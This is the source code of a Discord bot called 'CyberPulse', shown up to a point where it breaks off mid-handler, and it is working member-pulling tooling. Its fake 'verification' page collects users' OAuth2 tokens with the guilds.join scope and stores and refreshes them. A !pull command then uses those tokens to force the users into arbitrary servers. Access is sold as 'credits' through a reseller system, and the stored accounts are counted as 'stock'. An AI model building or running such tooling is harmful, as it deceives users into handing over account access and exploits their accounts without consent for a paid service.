const { 
  Client, 
  GatewayIntentBits, 
  EmbedBuilder, 
  ActionRowBuilder, 
  ButtonBuilder, 
  ButtonStyle, 
  ModalBuilder, 
  TextInputBuilder, 
  TextInputStyle, 
  StringSelectMenuBuilder, 
  StringSelectMenuOptionBuilder,
  PermissionFlagsBits,
  ChannelType,
  SlashCommandBuilder,
  REST,
  Routes
} = require('discord.js');
const express = require('express');
const mongoose = require('mongoose');
const axios = require('axios');
require('dotenv').config();

// ==================== CONFIGURATION & ENVIRONMENT ====================
const TOKEN = process.env.DISCORD_TOKEN || process.env.BOT_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const PUBLIC_URL = process.env.PUBLIC_URL || 'https://oauth1-bb1j.onrender.com';
const REDIRECT_URI = process.env.REDIRECT_URI || `${PUBLIC_URL}/callback`;
const MONGO_URI = process.env.MONGO_URI;

// Exclusive Owner ID
const OWNER_ID = '1370594462941581433';

// Direct CDN Image URL for Panel & Verify embeds
const BANNER_IMAGE_URL = 'https://cdn.discordapp.com/attachments/1531305989410787418/1568198735694139402/Gemini_Generated_Image_xjoeqcxjoeqcxjoe.png?ex=6af19562&is=6af043e2&hm=4298d9d755b0a7b4ffe1b1afa3b14ff15639d997e53a1a0e110589ff341f2da2&';

if (!TOKEN || !CLIENT_ID || !CLIENT_SECRET || !MONGO_URI) {
  console.error("❌ [FATAL ERROR]: Missing critical environment variables in Render settings.");
  process.exit(1);
}

const startTime = Date.now();

// ==================== DATABASE SCHEMAS ====================
mongoose.connect(MONGO_URI)
  .then(() => console.log("⚡ [DATABASE] Connected to database successfully!"))
  .catch(err => console.error("❌ [DATABASE ERROR]:", err));

const userSchema = new mongoose.Schema({
  discordId: { type: String, required: true, unique: true },
  username: String,
  accessToken: { type: String, required: true },
  refreshToken: { type: String, required: true },
  expiresAt: { type: Date, required: true },
  verifiedAt: { type: Date, default: Date.now }
}, { collection: 'verifiedusers' });
const VerifiedUser = mongoose.model('VerifiedUser', userSchema);

const creditSchema = new mongoose.Schema({
  discordId: { type: String, required: true, unique: true },
  balance: { type: Number, default: 0 },
  onlineAdded: { type: Number, default: 0 },
  offlineAdded: { type: Number, default: 0 },
  reactionAdded: { type: Number, default: 0 },
  onlineConsumed: { type: Number, default: 0 },
  offlineConsumed: { type: Number, default: 0 },
  reactionConsumed: { type: Number, default: 0 }
}, { collection: 'usercredits' });
const UserCredit = mongoose.model('UserCredit', creditSchema);

const resellerSchema = new mongoose.Schema({
  discordId: { type: String, required: true, unique: true },
  addedAt: { type: Date, default: Date.now }
}, { collection: 'resellers' });
const Reseller = mongoose.model('Reseller', resellerSchema);

const partnerSchema = new mongoose.Schema({
  discordId: { type: String, required: true, unique: true },
  addedAt: { type: Date, default: Date.now }
}, { collection: 'partners' });
const Partner = mongoose.model('Partner', partnerSchema);

const guildConfigSchema = new mongoose.Schema({
  guildId: { type: String, required: true, unique: true },
  verifiedRoleId: { type: String, default: null }
}, { collection: 'guildconfigs' });
const GuildConfig = mongoose.model('GuildConfig', guildConfigSchema);

const activeSessions = new Map();

// Helper to check if a user has administrative/owner privileges (Owner or Partner)
async function hasOwnerPrivileges(userId) {
  if (userId === OWNER_ID) return true;
  const isPartner = await Partner.findOne({ discordId: userId });
  return !!isPartner;
}

// ==================== EXPRESS WEB SERVER SETUP ====================
const app = express();
app.use(express.json());

const successHtml = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CYBERPULSE // Authorization Complete</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background-color: #06070d;
      background-image: 
        radial-gradient(circle at 50% 30%, rgba(112, 0, 255, 0.15), transparent 60%),
        linear-gradient(to right, rgba(255, 255, 255, 0.03) 1px, transparent 1px),
        linear-gradient(to bottom, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
      background-size: 100% 100%, 40px 40px, 40px 40px;
      color: #e2e8f0; font-family: 'Rajdhani', sans-serif;
      min-height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden;
    }
    .container { width: 100%; max-width: 440px; padding: 20px; position: relative; }
    .card {
      background: rgba(13, 14, 24, 0.85); border: 1px solid rgba(139, 92, 246, 0.3);
      border-radius: 16px; padding: 40px 30px; text-align: center; backdrop-filter: blur(12px);
      box-shadow: 0 0 40px rgba(112, 0, 255, 0.2), inset 0 0 15px rgba(139, 92, 246, 0.1);
    }
    .subtitle { font-family: 'Orbitron', sans-serif; font-size: 0.75rem; letter-spacing: 3px; color: #a78bfa; text-transform: uppercase; margin-bottom: 8px; }
    .title {
      font-family: 'Orbitron', sans-serif; font-size: 1.6rem; font-weight: 800; letter-spacing: 2px;
      background: linear-gradient(135deg, #ffffff 0%, #38bdf8 100%);
      -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 25px; text-transform: uppercase;
    }
    .icon-wrapper {
      width: 72px; height: 72px; margin: 0 auto 25px; border-radius: 50%;
      background: rgba(16, 185, 129, 0.1); border: 2px dashed #10b981;
      display: flex; align-items: center; justify-content: center;
      box-shadow: 0 0 20px rgba(16, 185, 129, 0.3); animation: pulseGlow 2.5s infinite ease-in-out;
    }
    .icon-wrapper svg { width: 34px; height: 34px; stroke: #10b981; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; fill: none; }
    .divider { height: 2px; width: 100%; background: linear-gradient(90deg, transparent, #8b5cf6, #38bdf8, transparent); margin-bottom: 25px; }
    .status-box { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 10px; padding: 16px; margin-bottom: 25px; }
    .status-title { font-family: 'Orbitron', sans-serif; font-size: 0.8rem; color: #38bdf8; letter-spacing: 1.5px; margin-bottom: 6px; }
    .status-desc { font-size: 0.95rem; color: #94a3b8; }
    .btn {
      width: 100%; padding: 14px; font-family: 'Orbitron', sans-serif; font-size: 0.85rem; font-weight: 700; letter-spacing: 2px;
      color: #ffffff; background: linear-gradient(135deg, #6366f1 0%, #3b82f6 100%);
      border: none; border-radius: 8px; cursor: pointer; box-shadow: 0 4px 15px rgba(99, 102, 241, 0.4); transition: all 0.2s ease;
    }
    .btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(99, 102, 241, 0.6); }
    @keyframes pulseGlow { 0%, 100% { box-shadow: 0 0 15px rgba(16, 185, 129, 0.3); } 50% { box-shadow: 0 0 30px rgba(16, 185, 129, 0.6); } }
  </style>
</head>
<body>
  <div class="container">
    <div class="card">
      <div class="subtitle">System Authorization</div>
      <h1 class="title">CyberPulse Management</h1>
      <div class="icon-wrapper">
        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
      </div>
      <div class="divider"></div>
      <div class="status-box">
        <div class="status-title">ACCESS GRANTED // VERIFIED</div>
        <div class="status-desc">Welcome, Operative. Clearance established successfully.</div>
      </div>
      <button class="btn" onclick="window.close()">TERMINATE WINDOW</button>
    </div>
  </div>
</body>
</html>
`;

app.get('/verify', (req, res) => {
  const discordOAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join`;
  res.redirect(discordOAuthUrl);
});

app.get('/callback', async (req, res) => {
  const code = req.query.code;
  if (!code) return res.status(400).send('❌ Authorization failed.');

  try {
    const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
      client_id: CLIENT_ID, client_secret: CLIENT_SECRET, grant_type: 'authorization_code', code, redirect_uri: REDIRECT_URI
    }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

    const { access_token, refresh_token, expires_in } = tokenResponse.data;
    const expiresAt = new Date(Date.now() + expires_in * 1000);

    const userResponse = await axios.get('https://discord.com/api/users/@me', {
      headers: { Authorization: `Bearer ${access_token}` }
    });

    const discordId = userResponse.data.id;
    const username = userResponse.data.username;

    await VerifiedUser.findOneAndUpdate(
      { discordId },
      { username, accessToken: access_token, refreshToken: refresh_token, expiresAt, verifiedAt: Date.now() },
      { upsert: true, new: true }
    );

    // Auto-assign Verified Role across connected guilds
    client.guilds.cache.forEach(async (guild) => {
      try {
        const config = await GuildConfig.findOne({ guildId: guild.id });
        if (config && config.verifiedRoleId) {
          const member = await guild.members.fetch(discordId).catch(() => null);
          if (member) {
            await member.roles.add(config.verifiedRoleId).catch(() => {});
          }
        }
      } catch (e) {}
    });

    res.send(successHtml);
  } catch (error) {
    res.status(500).send('❌ Authentication protocol failed.');
  }
});

app.get('/', (req, res) => res.status(200).send('⚡ CYBERPULSE OAUTH SYSTEM ONLINE'));
const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`🚀 [WEB SERVER] Running live on port ${PORT}`));

// ==================== DISCORD BOT SETUP ====================
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildPresences
  ]
});

// Register Slash Commands
const slashCommands = [
  new SlashCommandBuilder()
    .setName('verifiedrole')
    .setDescription('🛡️ Configure the verified role assigned automatically upon user verification.')
    .addRoleOption(option => 
      option.setName('role')
        .setDescription('Select the verified role')
        .setRequired(true)
    )
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
].map(cmd => cmd.toJSON());

const rest = new REST({ version: '10' }).setToken(TOKEN);

client.once('ready', async () => {
  console.log(`🤖 [DISCORD BOT] Online and locked in as ${client.user.tag}!`);
  try {
    console.log('🔄 Registering global slash commands...');
    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: slashCommands });
    console.log('✅ Slash commands registered successfully.');
  } catch (err) {
    console.error('❌ Failed to register slash commands:', err);
  }
});

// Background Token Refresh Guardian
setInterval(async () => {
  try {
    const users = await VerifiedUser.find({});
    for (const user of users) {
      if (user.expiresAt < new Date(Date.now() + 86400000)) {
        try {
          const res = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: CLIENT_ID, client_secret: CLIENT_SECRET, grant_type: 'refresh_token', refresh_token: user.refreshToken
          }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

          user.accessToken = res.data.access_token;
          user.refreshToken = res.data.refresh_token;
          user.expiresAt = new Date(Date.now() + res.data.expires_in * 1000);
          await user.save();
        } catch (e) {}
      }
    }
  } catch (err) {}
}, 3600000);

// Global Error Catching
process.on('unhandledRejection', error => console.error('⚠️ Unhandled Rejection:', error));
process.on('uncaughtException', error => console.error('⚠️ Uncaught Exception:', error));

// ==================== MESSAGE COMMANDS ====================
client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;

  const prefix = '!';
  if (!message.content.startsWith(prefix)) return;

  const args = message.content.slice(prefix.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  const isOwner = message.author.id === OWNER_ID;
  const hasPrivileges = await hasOwnerPrivileges(message.author.id);

  try {
    // 1. !verify command
    if (command === 'verify') {
      const embed = new EmbedBuilder()
        .setColor(0x7000ff)
        .setTitle('⚡ CyberPulse System Clearance & Verification')
        .setDescription('✨ Click the secure button below to complete OAuth2 authorization, claim your verified role, and unlock full server access.')
        .setImage(BANNER_IMAGE_URL)
        .setFooter({ text: 'CyberPulse Security Protocol 🛡️' });

      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setLabel('Verify System Clearance')
          .setStyle(ButtonStyle.Link)
          .setURL(`${PUBLIC_URL}/verify`)
          .setEmoji('🔐')
      );

      return message.reply({ embeds: [embed], components: [row] });
    }

    // 2. !panel command -> OWNER & PARTNERS ONLY
    if (command === 'panel') {
      if (!hasPrivileges) {
        return message.reply('❌ **Access Denied:** Only the bot owner or authorized partners can deploy the master panel.');
      }

      const embed = new EmbedBuilder()
        .setColor(0x7000ff)
        .setTitle('💎 CyberPulse Management & Ticket Hub 🚀')
        .setDescription('🛒 **Buy Credits:** Open a private ticket with administration.\n💳 **My Credits:** Check your available balance.\n⚡ **Add Members:** Initialize deployment sequence.\n\n*Fast, high-quality cybernetic service guaranteed ❤️.*')
        .setImage(BANNER_IMAGE_URL)
        .setFooter({ text: 'CyberPulse Secure Panel v6.0 ⚡' });

      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('btn_buy_credits_ticket').setLabel('Buy Credits').setStyle(ButtonStyle.Success).setEmoji('🛒'),
        new ButtonBuilder().setCustomId('btn_my_credits').setLabel('My Credits').setStyle(ButtonStyle.Secondary).setEmoji('💳'),
        new ButtonBuilder().setCustomId('btn_add_members').setLabel('Add Members').setStyle(ButtonStyle.Primary).setEmoji('⚡'),
        new ButtonBuilder().setLabel('Add Bot').setStyle(ButtonStyle.Link).setURL(`https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&scope=bot`).setEmoji('🤖')
      );

      return message.reply({ embeds: [embed], components: [row] });
    }

    // 3. !gc command -> OWNER & PARTNERS ONLY
    if (command === 'gc') {
      if (!hasPrivileges) {
        return message.reply('❌ **Access Denied:** Owner or Partner clearance required.');
      }

      const targetUser = message.mentions.users.first();
      const amount = parseInt(args[1], 10);

      if (!targetUser || isNaN(amount) || amount <= 0) {
        return message.reply('❌ Usage: `!gc @user <amount>`');
      }

      const totalStock = await VerifiedUser.countDocuments();
      if (amount > totalStock) {
        return message.reply(`❌ Error: You cannot grant **${amount}** credits. Maximum available verified stock in database is **${totalStock}**.`);
      }

      let userCredit = await UserCredit.findOne({ discordId: targetUser.id });
      if (!userCredit) {
        userCredit = new UserCredit({ discordId: targetUser.id, balance: 0 });
      }

      userCredit.balance += amount;
      userCredit.offlineAdded += amount; // Track added offline credits
      await userCredit.save();

      const embed = new EmbedBuilder()
        .setColor(0x10b981)
        .setTitle('📦 CyberPulse Credits Issued! 🚀')
        .setDescription(`🖤 **${amount.toLocaleString()}** credits have been added to <@${targetUser.id}>'s account!`)
        .addFields(
          { name: '🌟 Current User Balance:', value: `\`${userCredit.balance} credits\``, inline: false },
          { name: '📦 Database Stock Remaining:', value: `\`${totalStock} accounts\``, inline: false }
        )
        .setTimestamp();

      return message.reply({ content: `<@${targetUser.id}>`, embeds: [embed] });
    }

    // 4. !rc command -> OWNER & PARTNERS ONLY
    if (command === 'rc') {
      if (!hasPrivileges) {
        return message.reply('❌ **Access Denied:** Owner or Partner clearance required.');
      }

      const targetUser = message.mentions.users.first();
      const amount = parseInt(args[1], 10);

      if (!targetUser || isNaN(amount) || amount <= 0) {
        return message.reply('❌ Usage: `!rc @user <amount>`');
      }

      let userCredit = await UserCredit.findOne({ discordId: targetUser.id });
      if (!userCredit) {
        userCredit = new UserCredit({ discordId: targetUser.id, balance: 0 });
      }

      const deducted = Math.min(userCredit.balance, amount);
      userCredit.balance = Math.max(0, userCredit.balance - amount);
      userCredit.offlineConsumed += deducted; // Track consumed credits
      await userCredit.save();

      const embed = new EmbedBuilder()
        .setColor(0xef4444)
        .setTitle('🔻 CyberPulse Credits Deducted ⚠️')
        .setDescription(`🖤 **${amount.toLocaleString()}** credits have been removed from <@${targetUser.id}>'s balance!`)
        .addFields(
          { name: '🌟 New User Balance:', value: `\`${userCredit.balance} credits\``, inline: false }
        )
        .setTimestamp();

      return message.reply({ content: `<@${targetUser.id}>`, embeds: [embed] });
    }

    // 5. !resetcredits command -> OWNER & PARTNERS ONLY
    if (command === 'resetcredits') {
      if (!hasPrivileges) return message.reply('❌ Access Denied.');
      const targetUser = message.mentions.users.first();
      if (!targetUser) return message.reply('❌ Usage: `!resetcredits @user`');

      await UserCredit.findOneAndUpdate({ discordId: targetUser.id }, { balance: 0, offlineAdded: 0, offlineConsumed: 0 }, { upsert: true });
      return message.reply(`✨ Successfully wiped all credits for <@${targetUser.id}>. 🔄`);
    }

    // 6. !partner & !removepartner -> OWNER ONLY (Strictly Owner)
    if (command === 'partner') {
      if (!isOwner) return message.reply('❌ **Access Denied:** Only the absolute owner can assign partners.');
      const targetUser = message.mentions.users.first();
      if (!targetUser) return message.reply('⚠️ **Usage:** `!partner @user`');

      await Partner.findOneAndUpdate({ discordId: targetUser.id }, { discordId: targetUser.id }, { upsert: true });
      return message.reply(`🤝 Successfully appointed <@${targetUser.id}> as a CyberPulse **Partner** with full administrative command permissions! ✨`);
    }

    if (command === 'removepartner') {
      if (!isOwner) return message.reply('❌ **Access Denied:** Only the absolute owner can remove partners.');
      const targetUser = message.mentions.users.first();
      if (!targetUser) return message.reply('⚠️ **Usage:** `!removepartner @user`');

      const result = await Partner.findOneAndDelete({ discordId: targetUser.id });
      if (!result) return message.reply(`⚠️ <@${targetUser.id}> was not found in the partner registry.`);
      return message.reply(`🚫 Successfully revoked partner privileges from <@${targetUser.id}>.`);
    }

    // 7. !reseller & !removereseller -> OWNER & PARTNERS ONLY
    if (command === 'reseller') {
      if (!hasPrivileges) return message.reply('❌ **Access Denied:** Owner or Partner clearance required.');
      const targetUser = message.mentions.users.first();
      if (!targetUser) return message.reply('⚠️ **Usage:** `!reseller @user`');

      await Reseller.findOneAndUpdate({ discordId: targetUser.id }, { discordId: targetUser.id }, { upsert: true });
      return message.reply(`💼 Successfully registered <@${targetUser.id}> as an official CyberPulse **Reseller**! 🌟`);
    }

    if (command === 'removereseller') {
      if (!hasPrivileges) return message.reply('❌ **Access Denied:** Owner or Partner clearance required.');
      const targetUser = message.mentions.users.first();
      if (!targetUser) return message.reply('⚠️ **Usage:** `!removereseller @user`');

      const result = await Reseller.findOneAndDelete({ discordId: targetUser.id });
      if (!result) return message.reply(`⚠️ <@${targetUser.id}> was not found in the reseller registry.`);
      return message.reply(`🚫 Successfully removed <@${targetUser.id}> from the reseller registry.`);
    }

    // 8. !resale @user <amount> -> RESELLERS, PARTNERS & OWNER CAN TRANSFER CREDITS
    if (command === 'resale') {
      const targetUser = message.mentions.users.first();
      const amount = parseInt(args[1], 10);

      if (!targetUser || isNaN(amount) || amount <= 0) {
        return message.reply('⚠️ **Usage:** `!resale @user <amount>`');
      }

      if (targetUser.id === message.author.id) {
        return message.reply('❌ You cannot transfer credits to yourself!');
      }

      // Check if user is an authorized reseller, partner, or owner
      const isReseller = await Reseller.findOne({ discordId: message.author.id });
      if (!isReseller && !hasPrivileges) {
        return message.reply('❌ **Access Denied:** You must be a registered CyberPulse reseller or partner to execute credit transfers.');
      }

      let senderCredit = await UserCredit.findOne({ discordId: message.author.id });
      if (!senderCredit || senderCredit.balance < amount) {
        return message.reply(`❌ Insufficient balance. You attempted to transfer **${amount}** credits, but your balance is **${senderCredit ? senderCredit.balance : 0}**.`);
      }

      // Deduct from sender and track consumption
      senderCredit.balance -= amount;
      senderCredit.offlineConsumed += amount;
      await senderCredit.save();

      // Add to recipient and track addition
      let recipientCredit = await UserCredit.findOne({ discordId: targetUser.id });
      if (!recipientCredit) {
        recipientCredit = new UserCredit({ discordId: targetUser.id, balance: 0 });
      }
      recipientCredit.balance += amount;
      recipientCredit.offlineAdded += amount;
      await recipientCredit.save();

      const embed = new EmbedBuilder()
        .setColor(0x38bdf8)
        .setTitle('💼 CyberPulse Credit Resale Transfer ⚡')
        .setDescription(`✨ Successfully transferred **${amount.toLocaleString()}** credits from <@${message.author.id}> to <@${targetUser.id}>!`)
        .addFields(
          { name: '📤 Your Remaining Balance', value: `\`${senderCredit.balance} credits\``, inline: true },
          { name: '📥 Recipient Balance', value: `\`${recipientCredit.balance} credits\``, inline: true }
        )
        .setTimestamp();

      return message.reply({ content: `<@${targetUser.id}>`, embeds: [embed] });
    }

    // 9. !irbal / !rbal -> EXACT PUNISHER RESELLER BALANCE STYLE
    if (command === 'irbal' || command === 'rbal') {
      const targetUser = message.mentions.users.first() || message.author;
      
      const isReseller = await Reseller.findOne({ discordId: targetUser.id });
      const isPart = await Partner.findOne({ discordId: targetUser.id });
      const isUsrOwner = targetUser.id === OWNER_ID;

      if (!isReseller && !isPart && !isUsrOwner && targetUser.id !== message.author.id) {
        return message.reply('❌ That user is not registered as an active reseller.');
      }

      let uc = await UserCredit.findOne({ discordId: targetUser.id });
      if (!uc) uc = { balance: 0, onlineAdded: 0, offlineAdded: 0, reactionAdded: 0, onlineConsumed: 0, offlineConsumed: 0, reactionConsumed: 0 };

      // Get user avatar or fallback to a cyberpunk default graphic
      const avatarUrl = targetUser.displayAvatarURL({ dynamic: true, size: 256 }) || BANNER_IMAGE_URL;

      const embed = new EmbedBuilder()
        .setColor(0x2b2d31)
        .setAuthor({ name: `Reseller Balance — ${targetUser.username}`, iconURL: 'https://cdn.discordapp.com/emojis/841261569083815946.webp?size=96' })
        .setDescription(`**Status:** ✅ Active\n\n🟢 **Online Members:** 0\n🔘 **Offline Members:** ${uc.balance.toLocaleString()}\n🎉 **Reaction Members:** 0\n\n──────────────────────────────\n\n📈 **Online Added:** 0\n📈 **Offline Added:** ${uc.offlineAdded.toLocaleString()}\n📈 **Reaction Added:** 0\n📉 **Online Consumed:** 0\n📉 **Offline Consumed:** ${uc.offlineConsumed.toLocaleString()}\n📉 **Reaction Consumed:** 0`)
        .setThumbnail(avatarUrl)
        .setFooter({ text: 'CyberPulse • Reseller' })
        .setTimestamp();

      return message.reply({ embeds: [embed] });
    }

    // 10. !pull command -> OWNER & PARTNERS ONLY (Classic manual pull protocol)
    if (command === 'pull') {
      if (!hasPrivileges) {
        return message.reply('❌ **Access Denied:** Owner or Partner clearance required to run manual pull protocols.');
      }

      const targetGuildId = args[0];
      if (!targetGuildId) {
        return message.reply('❌ Error: Please provide a target Guild ID. Usage: `!pull <GUILD_ID> [LIMIT]`');
      }

      const pullLimit = args[1] ? parseInt(args[1], 10) : null;
      const statusMsg = await message.reply(`🚀 **CyberPulse Protocol:** Synchronizing database tokens into target \`${targetGuildId}\`...\n*Please wait...*`);

      try {
        const targetGuild = await client.guilds.fetch(targetGuildId);
        const verifiedUsers = await VerifiedUser.find({});
        if (verifiedUsers.length === 0) {
          return statusMsg.edit('⚠️ **CyberPulse Warning:** No verified users found in storage.');
        }

        let successfulJoins = 0;
        let alreadyInServer = 0;
        let failedJoins = 0;
        const startTimePull = Date.now();

        for (const userRecord of verifiedUsers) {
          if (pullLimit && successfulJoins >= pullLimit) break;
          try {
            const member = await targetGuild.members.fetch(userRecord.discordId).catch(() => null);
            if (member) {
              alreadyInServer++;
              continue;
            }

            await targetGuild.members.add(userRecord.discordId, { accessToken: userRecord.accessToken });
            successfulJoins++;
            await new Promise(r => setTimeout(r, 600));
          } catch (err) {
            failedJoins++;
          }
        }

        const timeTaken = ((Date.now() - startTimePull) / 1000).toFixed(1);
        const reportEmbed = new EmbedBuilder()
          .setColor(0x10b981)
          .setTitle('🔥 CYBERPULSE // Manual Pull Execution Report 🚀')
          .addFields(
            { name: '🎯 Target Guild ID', value: `\`${targetGuildId}\``, inline: false },
            { name: '✅ Successful Joins', value: `\`${successfulJoins}\``, inline: true },
            { name: '🔄 Already in Server', value: `\`${alreadyInServer}\``, inline: true },
            { name: '❌ Failed / Expired', value: `\`${failedJoins}\``, inline: true },
            { name: '⏱️ Time Taken', value: `\`${timeTaken}s\``, inline: true }
          )
          .setTimestamp();

        return statusMsg.edit({ content: null, embeds: [reportEmbed] });
      } catch (err) {
        return statusMsg.edit('❌ Critical error executing manual pull protocol.');
      }
    }

    // 11. !broadcast command -> OWNER & PARTNERS ONLY
    if (command === 'broadcast') {
      if (!hasPrivileges) return message.reply('❌ Access Denied.');
      const broadcastText = args.join(' ');
      if (!broadcastText) return message.reply('❌ Usage: `!broadcast <message>`');

      const embed = new EmbedBuilder()
        .setColor(0x7000ff)
        .setTitle('📢 CYBERPULSE // Network Broadcast ⚡')
        .setDescription(broadcastText)
        .setFooter({ text: 'CyberPulse Official Announcement' })
        .setTimestamp();

      let count = 0;
      client.guilds.cache.forEach(guild => {
        const defaultChannel = guild.channels.cache.find(c => c.type === ChannelType.GuildText && c.permissionsFor(guild.members.me).has(PermissionFlagsBits.SendMessages));
        if (defaultChannel) {
          defaultChannel.send({ embeds: [embed] }).catch(() => {});
          count++;
        }
      });

      return message.reply(`📡 Broadcast sent to **${count}** server channels.`);
    }

    // 12. !bal command
    if (command === 'bal' || command === 'balance') {
      const targetUser = message.mentions.users.first() || message.author;
      let uc = await UserCredit.findOne({ discordId: targetUser.id });
      if (!uc) uc = { balance: 0 };

      const embed = new EmbedBuilder()
        .setColor(0x38bdf8)
        .setTitle(`💳 Balance Overview — ${targetUser.username} ⚡`)
        .addFields(
          { name: 'Available Pull Credits', value: `\`${uc.balance}\``, inline: true }
        )
        .setTimestamp();

      return message.reply({ embeds: [embed] });
    }

    // 13. !stock command
    if (command === 'stock') {
      const totalStock = await VerifiedUser.countDocuments();
      const embed = new EmbedBuilder()
        .setColor(0x8b5cf6)
        .setTitle('📦 CyberPulse Stock Overview ⚡')
        .addFields(
          { name: '⚫ Total Verified Accounts', value: `\`${totalStock}\``, inline: true },
          { name: '⚡ System Status', value: '`ONLINE // READY`', inline: false }
        )
        .setFooter({ text: 'CyberPulse Inventory Engine' })
        .setTimestamp();

      return message.reply({ embeds: [embed] });
    }

    // 14. !stats command
    if (command === 'stats') {
      const totalUsers = await VerifiedUser.countDocuments();
      const uptimeMs = Date.now() - startTime;
      const uptimeHours = Math.floor(uptimeMs / (1000 * 60 * 60));
      const uptimeMins = Math.floor((uptimeMs % (1000 * 60 * 60)) / (1000 * 60));
      const memoryUsageMB = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);

      let onlineCount = 0, idleCount = 0, dndCount = 0, offlineCount = 0;
      if (message.guild) {
        message.guild.members.cache.forEach(m => {
          const s = m.presence?.status;
          if (s === 'online') onlineCount++;
          else if (s === 'idle') idleCount++;
          else if (s === 'dnd') dndCount++;
          else offlineCount++;
        });
      }

      const embed = new EmbedBuilder()
        .setColor(0x10b981)
        .setTitle('📊 CYBERPULSE // Neural Telemetry Matrix 🚀')
        .setDescription('💎 Real-time diagnostic metrics across database nodes and active sessions.')
        .addFields(
          { name: '🧬 Total Verified Users', value: `\`${totalUsers}\``, inline: false },
          { name: '🟢 Online', value: `\`${onlineCount}\``, inline: true },
          { name: '🟡 Idle', value: `\`${idleCount}\``, inline: true },
          { name: '🔴 Do Not Disturb', value: `\`${dndCount}\``, inline: true },
          { name: '⚫ Offline / Cached', value: `\`${offlineCount}\``, inline: true },
          { name: '📡 API Latency', value: `\`${client.ws.ping}ms\``, inline: true },
          { name: '💻 RAM Heap', value: `\`${memoryUsageMB} MB\``, inline: true },
          { name: '⏳ Core Uptime', value: `\`${uptimeHours}h ${uptimeMins}m\``, inline: false },
          { name: '⚡ Database Status', value: '`Connected & Stable`', inline: false }
        )
        .setFooter({ text: 'CYBERPULSE MANAGEMENT • Secure Telemetry v6.0' })
        .setTimestamp();

      return message.reply({ embeds: [embed] });
    }

  } catch (err) {
    console.error(`❌ Command Error (${command}):`, err);
    return message.reply('❌ An internal error occurred while executing this command.');
  }
});

// ==================== INTERACTION HANDLING ====================
client.on('interactionCreate', async (interaction) => {
  try {
    // 1. Slash Commands
    if (interaction.isChatInputCommand()) {
      if (interaction.commandName === 'verifiedrole') {
        const role = interaction.options.getRole('role');
        await GuildConfig.findOneAndUpdate(
          { guildId: interaction.guild.id },
          { verifiedRoleId: role.id },
          { upsert: true }
        );

        return interaction.reply({ 
          content: `✅ **Verified Role Updated:** Successfully set ${role} as the reward role for verified users! 🛡️`, 
          ephemeral: true 
        });
      }
    }

    // 2. Button Clicks
    if (interaction.isButton()) {
      // TICKET SYSTEM: BUY CREDITS
      if (interaction.customId === 'btn_buy_credits_ticket') {
        const cleanName = interaction.user.username.toLowerCase().replace(/[^a-z0-9]/g, '');
        const channelName = `ticket-${cleanName}`;
        
        const existing = interaction.guild.channels.cache.find(c => c.name === channelName);
        if (existing) {
          return interaction.reply({ content: `❌ You already have an active ticket channel: ${existing}`, ephemeral: true });
        }

        const channel = await interaction.guild.channels.create({
          name: channelName,
          type: ChannelType.GuildText,
          permissionOverwrites: [
            { id: interaction.guild.roles.everyone.id, deny: [PermissionFlagsBits.ViewChannel] },
            { id: interaction.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.AttachFiles] },
            { id: OWNER_ID, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ManageChannels] }
          ]
        });

        const ticketEmbed = new EmbedBuilder()
          .setColor(0x7000ff)
          .setTitle('🛒 CyberPulse Credit Purchase Ticket ⚡')
          .setDescription(`Welcome <@${interaction.user.id}>!\n\nThis is your private secure channel with administration (<@${OWNER_ID}>).\nState your inquiry or how many credits you wish to acquire.`)
          .setTimestamp();

        const closeRow = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId('btn_close_ticket').setLabel('Close Ticket').setStyle(ButtonStyle.Danger).setEmoji('🔒')
        );

        await channel.send({ content: `<@${interaction.user.id}> | <@${OWNER_ID}>`, embeds: [ticketEmbed], components: [closeRow] });
        return interaction.reply({ content: `✅ Private ticket created successfully: ${channel}`, ephemeral: true });
      }

      if (interaction.customId === 'btn_close_ticket') {
        await interaction.reply('🔒 Terminating ticket session in 3 seconds...');
        setTimeout(() => interaction.channel.delete().catch(() => {}), 3000);
        return;
      }

      if (interaction.customId === 'btn_my_credits') {
        let uc = await UserCredit.findOne({ discordId: interaction.user.id });
        if (!uc) uc = { balance: 0 };
        return interaction.reply({
          content: `💳 **Your Balance:** \`${uc.balance}\` credits ⚡`,
          ephemeral: true
        });
      }

      if (interaction.customId === 'btn_add_members') {
